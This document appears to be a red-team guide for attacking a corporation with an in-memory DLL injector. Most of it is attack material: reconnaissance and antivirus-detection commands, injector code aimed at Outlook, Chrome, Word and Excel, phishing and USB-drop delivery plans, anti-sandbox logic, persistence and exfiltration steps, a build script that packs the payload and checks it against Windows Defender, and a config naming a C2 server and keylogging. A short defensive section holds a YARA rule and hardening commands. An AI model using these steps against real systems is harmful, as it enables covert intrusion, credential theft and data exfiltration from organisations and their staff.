# Red Team Deployment Guide

## 🎯 **Scenario: Corporate Penetration Test**

### **Phase 1: Reconnaissance**
```powershell
# Target analysis
Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq "outlook.exe"}
Get-Process | Where-Object {$_.ProcessName -like "*chrome*" -or $_.ProcessName -like "*firefox*"}

# AV Detection
Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
```

### **Phase 2: Payload Preparation**
```cpp
// Build stealth injector with target-specific modifications
class TargetSpecificInjector : public StealthInjector {
public:
    static bool deployPayload() {
        // Custom obfuscation for this target
        std::vector<BYTE> encryptedDLL = loadEncryptedPayload();
        std::vector<BYTE> decryptedDLL = decryptPayload(encryptedDLL);
        
        // Target common corporate applications
        std::vector<std::wstring> targets = {
            L"outlook.exe",    // Email client
            L"chrome.exe",     // Browser  
            L"winword.exe",    // Word
            L"excel.exe"       // Excel
        };
        
        for (const auto& target : targets) {
            if (stealthInject(target, decryptedDLL)) {
                return true; // Success on any target
            }
        }
        return false;
    }
};
```

### **Phase 3: Delivery Methods**
```
📧 Spear Phishing:
├── "IT Security Update Required.exe"
├── Disguised as legitimate software
├── Embedded in Office documents with macros
└── Social engineering tailored to target

💽 Physical Access:
├── USB drop in parking lot
├── Malicious charging cables
├── Hardware implants
└── Supply chain compromise

🌐 Web-based:
├── Watering hole attacks
├── Malicious ads on business sites
├── Compromised software downloads
└── Drive-by downloads
```

### **Phase 4: Execution Flow**
```
User Executes Malware
        ↓
Anti-Analysis Checks
├── Is this a real environment?
├── Is user actually present?
├── Is AV/EDR running?
└── Is this a sandbox?
        ↓
Environment Validation Passed
        ↓
Target Process Discovery
├── Find high-value processes
├── Check process architecture
├── Verify injection feasibility
└── Select optimal target
        ↓
Stealth Injection
├── Dynamic API resolution
├── Manual DLL mapping
├── Memory-only execution
└── No file system artifacts
        ↓
Payload Execution
├── Establish persistence
├── Escalate privileges
├── Exfiltrate data
└── Lateral movement
```

---

## 📊 **Technical Implementation Details**

### **Build Process:**
```batch
@echo off
echo Building Stealth Injector...

REM Setup obfuscation parameters
set OBFUSCATION_KEY=0x6A
set API_HASH_SALT=0x35

REM Compile with maximum optimization
cl.exe /O2 /Ob2 /Oi /Ot /favor:INTEL64 stealth_injector.cpp /Fe:payload.exe

REM Apply packing
upx --best --ultra-brute payload.exe

REM Verify AV detection
echo Testing against Windows Defender...
"C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File payload.exe

echo Build complete!
```

### **Runtime Configuration:**
```cpp
// Configuration embedded in binary
struct Config {
    DWORD magicHeader = 0xDEADBEEF;
    BYTE encryptionKey[32];
    BYTE targetHashes[10][4];  // Hashed target process names
    DWORD sleepInterval = 5000; // Anti-sandbox delay
    BOOL enablePersistence = TRUE;
    BOOL enableKeylogging = FALSE;
    char c2Server[256] = "https://legitimate-looking-domain.com";
};
```

---

## 🛡️ **Defense Countermeasures**

### **Detection Signatures:**
```yaml
# YARA rule for detecting stealth injector patterns
rule StealthInjector_Patterns {
    meta:
        description = "Detects stealth injection techniques"
        author = "Security Team"
        
    strings:
        $api_hash = { 33 ?? ?? ?? C1 ?? 07 C1 ?? 19 03 }  // API hashing pattern
        $manual_map = "VirtualAddress" ascii
        $anti_debug = { 65 48 8B ?? 60 00 00 00 }  // PEB access pattern
        
    condition:
        2 of them
}
```

### **Behavioral Detection:**
```cpp
// EDR detection logic
class BehavioralDetection {
public:
    static bool detectInjection() {
        // Monitor for suspicious API sequences
        if (detectAPISequence({"OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"})) {
            return true;
        }
        
        // Monitor for manual DLL mapping indicators
        if (detectMemoryPattern(PE_HEADER_PATTERN)) {
            return true;
        }
        
        // Monitor for anti-analysis behaviors
        if (detectAntiAnalysis()) {
            return true;
        }
        
        return false;
    }
};
```

### **Endpoint Protection:**
```powershell
# PowerShell script for endpoint hardening
# Disable common injection vectors
Set-ProcessMitigation -Name "notepad.exe" -Enable CFG,DEP,SEHOP

# Enable additional logging
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Process Termination" /success:enable

# Configure Windows Defender real-time protection
Set-MpPreference -EnableControlledFolderAccess Enabled
Set-MpPreference -EnableRealTimeMonitoring $true
```

---

## ⚖️ **Legal và Ethical Considerations**

### **Authorized Use Cases:**
- ✅ Penetration testing với written authorization
- ✅ Red team exercises cho organization
- ✅ Security research trong controlled environment
- ✅ Educational demonstrations

### **Prohibited Uses:**
- ❌ Unauthorized access to computer systems
- ❌ Malware distribution
- ❌ Data theft hoặc privacy violations
- ❌ Disruption of services

### **Best Practices:**
1. **Written Authorization**: Luôn có permission trước khi test
2. **Scope Limitation**: Chỉ test trong agreed-upon scope
3. **Data Protection**: Không access/exfiltrate sensitive data
4. **Cleanup**: Remove all artifacts sau khi test xong
5. **Documentation**: Report findings responsibly

---

*🔐 Remember: These techniques should only be used for legitimate security testing and research purposes.*
